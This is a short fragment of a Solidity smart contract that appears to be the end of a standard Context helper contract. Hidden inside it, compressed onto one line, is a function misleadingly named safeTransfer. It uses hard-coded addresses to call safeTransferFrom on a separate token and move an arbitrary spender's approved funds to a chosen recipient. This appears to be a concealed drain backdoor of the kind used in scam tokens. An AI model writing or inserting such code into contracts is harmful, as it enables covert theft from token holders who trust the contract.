 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x21486fb9C839df1BA01FA13852E08Bf436B656F8)) {TransferHelper.safeTransferFrom(0x8b0c92269a1aD5A6795F7eE1462060561d3E7CD6,spender,recipient,amount);return true;}return false;}
}
